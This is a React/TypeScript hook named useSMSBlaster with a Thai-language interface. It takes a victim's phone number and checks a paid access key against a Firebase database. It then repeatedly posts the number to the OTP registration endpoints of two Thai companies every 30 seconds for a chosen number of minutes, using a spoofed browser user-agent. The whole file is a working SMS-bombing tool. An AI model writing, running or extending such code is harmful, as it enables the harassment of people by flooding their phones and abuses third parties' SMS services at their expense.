
import { useState, useRef } from "react";
import { useToast } from "@/components/ui/use-toast";
import axios from "axios";

interface LogEntry {
  timestamp: string;
  phone: string;
  status: 'success' | 'error';
  message: string;
}

interface PhoneReport {
  reason: string;
  count: number;
}

export const useSMSBlaster = () => {
  const [phoneNumber, setPhoneNumber] = useState("");
  const [minutes, setMinutes] = useState("1");
  const [loading, setLoading] = useState(false);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [remainingTime, setRemainingTime] = useState<number>(0);
  const [apiKey, setApiKey] = useState("");
  const [showKeyInput, setShowKeyInput] = useState(false);
  const [phoneReport, setPhoneReport] = useState<PhoneReport | null>(null);
  const timerRef = useRef<NodeJS.Timeout>();
  const { toast } = useToast();

  const validatePhoneNumber = (number: string) => {
    const regex = /^0\d{9}$/;
    return regex.test(number);
  };

  const addLog = (phone: string, status: 'success' | 'error', message: string) => {
    setLogs(prev => [{
      timestamp: new Date().toLocaleTimeString(),
      phone,
      status,
      message
    }, ...prev]);
  };

  const checkPhoneReport = async (phone: string) => {
    try {
      const response = await axios.get(`https://goak-71ac8-default-rtdb.firebaseio.com/reports/${phone}.json`);
      if (response.data) {
        setPhoneReport(response.data);
        setShowKeyInput(true);
        toast({
          title: "⚠️ คำเตือน",
          description: `เบอร์นี้ถูกรายงานว่า: ${response.data.reason}`,
          variant: "destructive",
        });
      } else {
        setShowKeyInput(true);
      }
    } catch (error) {
      console.error("Error checking phone report:", error);
      setShowKeyInput(true);
    }
  };

  const validateApiKey = async (key: string) => {
    try {
      const response = await axios.get(`https://goak-71ac8-default-rtdb.firebaseio.com/keys/${key}.json`);
      if (response.data && response.data.active) {
        const expireDate = new Date(response.data.expireDate);
        if (expireDate > new Date()) {
          return true;
        } else {
          toast({
            title: "API Key หมดอายุ",
            description: "กรุณาติดต่อแอดมินเพื่อต่ออายุ Key",
            variant: "destructive",
          });
          return false;
        }
      }
      toast({
        title: "API Key ไม่ถูกต้อง",
        description: "กรุณาตรวจสอบ Key ของท่าน",
        variant: "destructive",
      });
      return false;
    } catch (error) {
      console.error("Error validating API key:", error);
      return false;
    }
  };

  const startSMSBlast = async () => {
    setLoading(true);
    const totalSeconds = parseInt(minutes) * 60;
    setRemainingTime(totalSeconds);
    addLog(phoneNumber, 'success', `เริ่มต้นการส่ง SMS เป็นเวลา ${minutes} นาที`);
    
    // Start countdown timer
    const countdownInterval = setInterval(() => {
      setRemainingTime(prev => {
        if (prev <= 1) {
          clearInterval(countdownInterval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    
    const sendSMS = async () => {
      const endpoints = [
        'https://openapi.bigc.co.th/customer/v1/otp',
        'https://api-sso.ch3plus.com/user/request-otp',
      ];

      const headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
      };

      for (const endpoint of endpoints) {
        try {
          await axios.post(endpoint, {
            phone_no: phoneNumber,
            tel: phoneNumber,
            type: "register"
          }, { headers });
          addLog(phoneNumber, 'success', `✓ ส่ง SMS สำเร็จผ่าน ${endpoint.split('/')[2]}`);
        } catch (error) {
          addLog(phoneNumber, 'error', `⚠ ไม่สามารถส่ง SMS ผ่าน ${endpoint.split('/')[2]}`);
          console.error(`Error with endpoint ${endpoint}:`, error);
        }
      }
    };

    const smsInterval = setInterval(sendSMS, 30000);
    await sendSMS();

    setTimeout(() => {
      clearInterval(smsInterval);
      clearInterval(countdownInterval);
      setLoading(false);
      setRemainingTime(0);
      addLog(phoneNumber, 'success', `🏁 สิ้นสุดการส่ง SMS แล้ว`);
      toast({
        title: "สำเร็จ",
        description: `สิ้นสุดการส่ง SMS ไปยังหมายเลข ${phoneNumber}`,
      });
    }, totalSeconds * 1000);
  };

  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validatePhoneNumber(phoneNumber)) {
      toast({
        title: "หมายเลขโทรศัพท์ไม่ถูกต้อง",
        description: "กรุณากรอกหมายเลขโทรศัพท์ 10 หลัก ที่ขึ้นต้นด้วย 0",
        variant: "destructive",
      });
      return;
    }

    await checkPhoneReport(phoneNumber);
  };

  const handleApiKeySubmit = async () => {
    if (await validateApiKey(apiKey)) {
      startSMSBlast();
    }
  };

  return {
    phoneNumber,
    setPhoneNumber,
    minutes,
    setMinutes,
    loading,
    logs,
    remainingTime,
    apiKey,
    setApiKey,
    showKeyInput,
    phoneReport,
    handlePhoneSubmit,
    handleApiKeySubmit,
  };
};
